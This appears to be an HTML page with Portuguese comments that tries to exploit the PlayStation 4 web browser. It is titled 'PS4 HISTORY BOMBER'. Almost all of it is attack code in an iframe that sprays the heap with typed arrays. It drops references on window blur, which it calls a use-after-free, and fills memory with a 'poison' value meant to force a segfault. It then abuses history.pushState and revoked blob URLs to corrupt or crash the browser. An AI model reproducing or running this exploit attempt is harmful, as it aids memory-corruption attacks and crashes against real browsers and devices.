<!DOCTYPE html>
<html>
<head>
    <title>PS4 HISTORY BOMBER</title>
    <style>
        body { background-color: #000; color: #0ff; font-family: monospace; text-align: center; }
        iframe { width: 90%; height: 400px; border: 4px solid #0ff; background: #222; margin: 20px auto; display: block;}
        button { padding: 20px 40px; font-size: 1.5em; cursor: pointer; background: #055; color: white; border: 2px solid #0ff; font-weight: bold; }
        #log { text-align: left; margin: 20px auto; width: 90%; border: 1px solid #555; padding: 10px; background: #111; color: #fff; }
    </style>
</head>
<body>

<h1>HISTORY STATE BOMBER</h1>
<h3>Técnica: Corrupção de Estado + Navegação Forçada</h3>

<iframe id="trigger_frame" srcdoc="
    <html>
    <body style='background:#003; color:#fff; text-align:center'>
        <h3>ZONA DO GATILHO</h3>
        <button onclick='startSequence()' style='padding:20px; background:blue; color:white; font-weight:bold; border:2px solid white;'>
            INICIAR BOMBA DE HISTÓRICO
        </button>
        <div id='status'>Pronto.</div>
        <script>
            var victims = [];
            var spray = [];
            const COUNT = 15000;
            // Usamos um valor que force SEGFAULT se lido como ponteiro
            const POISON = 2.121995791e-314; 

            function startSequence() {
                document.getElementById('status').innerText = '1. Alocando...';
                
                // 1. Setup Heap
                for(let i=0; i<COUNT; i++) {
                    let v = new Float64Array(16);
                    v.fill(1.1);
                    victims.push(v);
                }

                document.getElementById('status').innerText = '2. APERTE OPTIONS AGORA!';
                
                // Entra em Fullscreen (Necessário para o seu bug)
                var el = document.documentElement;
                var rfs = el.webkitRequestFullscreen || el.requestFullscreen;
                rfs.call(el);

                window.onblur = function() {
                    // 3. O ATAQUE (UAF)
                    victims = null;
                    
                    // Spray Massivo
                    for(let i=0; i<COUNT*2; i++) {
                        let s = new Float64Array(24);
                        s.fill(POISON);
                        spray.push(s);
                    }

                    // 4. A BOMBA DE HISTÓRICO
                    // O botão 'Atualizar' tenta salvar o estado. Vamos forçar isso manualmente.
                    // Criamos um objeto complexo para o navegador tentar ler.
                    
                    setTimeout(function() {
                        try {
                            // Cria um objeto Blob grande para sujar o Resource Manager
                            var dirtyData = new Uint8Array(1024*100); 
                            var blob = new Blob([dirtyData]);
                            var url = URL.createObjectURL(blob);
                            
                            // Empurra um estado complexo para o histórico
                            // Se a memória estiver corrompida, serializar isso deve matar o processo
                            history.pushState({ junk: dirtyData, ref: victims }, 'CRASH', '#crash');
                            
                            // Força o navegador a tentar processar a nova URL imediatamente
                            location.href = url;
                            
                            // Revoga a URL imediatamente para causar confusão de recursos
                            URL.revokeObjectURL(url);
                            
                        } catch(e) {
                            // Se falhar, tentamos o método bruto de window.close
                            window.close();
                        }
                    }, 50);
                };
            }
        </script>
    </body>
    </html>
"></iframe>

<div id="log">Logs do Sistema...</div>

<script>
    // Monitor de Vida
    setInterval(function(){
        document.getElementById('log').innerHTML = '>> Monitor: Navegador ativo... ' + new Date().toLocaleTimeString();
    }, 1000);
</script>

</body>
</html>
